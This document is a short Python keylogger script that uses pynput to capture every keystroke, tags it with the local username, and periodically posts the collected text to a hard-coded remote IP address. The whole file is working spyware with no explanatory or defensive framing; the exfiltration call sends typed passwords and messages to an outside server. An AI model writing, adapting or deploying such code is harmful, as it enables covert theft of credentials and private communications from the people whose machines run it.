from pynput import keyboard
import requests
import getpass

user = getpass.getuser()
keylog = ''

counter = 0
def count(characters):
    global counter
    global keylog
    counter = counter + characters
    if counter > 100:
        counter = 0
        try:
            info = {'name': user, 'data': keylog}
            requests.post('http://18.188.58.17/write', json=info)
            keylog = ''
        except:
            print("Cant Connect")
            
def on_press(key):
    global keylog
    try:
        keylog = keylog + key.char
        count(1)
    except AttributeError:
        if key == keyboard.Key.backspace:
            keylog = keylog + '-'
            count(1)
        elif key == keyboard.Key.space:
            keylog = keylog + ' '
            count(1)
        else:
            keylog = keylog + ' ' + str(key) + ' '
            count(len(str(key))+2)
            
listener = keyboard.Listener(on_press = on_press)
listener.start()
listener.join()